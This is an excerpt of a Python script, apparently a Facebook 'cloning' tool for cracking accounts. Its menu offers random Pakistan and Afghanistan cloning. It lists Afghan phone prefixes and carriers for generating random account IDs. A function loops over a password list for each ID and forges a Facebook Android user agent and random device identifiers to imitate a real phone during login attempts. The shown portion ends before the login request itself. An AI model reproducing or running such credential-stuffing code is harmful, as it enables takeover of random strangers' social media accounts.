...
AUTHER    :  RAEES HAQMAL
TEAM :  💗PASHTION
BROTHER ❤️: MIRWAIS DANISHYAR 🥰BILAL HAIDEER
...
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;96m[1] RANDOM PAKISTAN  CLONING V1\n\033[1;95m[2] RANDOM Afghanistan CLONING V2\n\033[1;93m[3] CONTACT BY RAEES HAQMAL  FB\n\033[1;91m[E] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			os.system('xdg-open   https://www.facebook.com/gumnaam.gumnaam.7737769?mibextid=ZbWKwL')
			if xd in ['1','01']:
				CRACKafghan()
			if xd in ['02','2']:
				CRACKafghan1()
...
def CRACKafghan1():
		user=[]
		clear()
		print('\033[1;33m 9377, 070, 074, 077, 078, 9377, 9370')
...
CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Etisalat']
...
def rndm2(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                android_version=str(random.randrange(6,13))
                                ua = 'Dalvik/2.1.0 (Linux; U; Android 11; Huawei H293 Max Build/RD1A.352039.028) [FBAN/FB4A;FBAV/423.0.0.21.64;FBBV/414.0.0.20.63;FBRV/0;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei H293 Max;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
